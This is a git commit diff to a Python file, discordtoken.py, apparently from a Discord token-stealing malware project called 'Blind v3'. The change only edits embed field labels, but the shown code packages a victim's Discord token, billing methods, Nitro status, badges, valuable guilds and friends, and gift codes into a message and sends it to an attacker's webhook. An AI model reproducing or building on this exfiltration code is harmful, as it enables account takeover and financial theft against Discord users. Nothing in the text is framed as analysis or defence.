d5dff5561e1327fb5f399010b8dfde469cfc0585
READDONE313 <98390001+READDONE313@users.noreply.github.com>
2023-05-07 17:07:21 +0000

    Update discordtoken.py

--- src/components/discordtoken.py
+++ src/components/discordtoken.py
@@ -342,7 +342,7 @@ class upload_tokens:
             embed = Embed(title=f"{username}", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="🔑 Token", value=f"```{token}```", inline=False)
+            embed.add_field(name="Token", value=f"```{token}```", inline=False)
             embed.add_field(name="Nitro", value=f"```{nitro}```", inline=True),
             embed.add_field(name="Badges", value=f"```{badges if badges != '' else 'None'}```", inline=True)
             embed.add_field(name="Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
@@ -354,9 +354,9 @@ class upload_tokens:
             if hq_guilds != None:
                 embed.add_field(name="HQ Guilds", value=hq_guilds, inline=False)
             if hq_friends != None:
-                embed.add_field(name="HQ Friends", value=hq_friends, inline=False)
+                embed.add_field(name="", value=hq_friends, inline=False)
             if codes != None:
-                embed.add_field(name="🎁 Gift Codes", value=codes, inline=False)
+                embed.add_field(name="Gift Codes", value=codes, inline=False)
             embed.set_footer(text="Created by: readdone#9772")
 
             self.webhook.send(embed=embed, username="Blind v3", avatar_url="https://i.imgur.com/LNVOaxg.png")
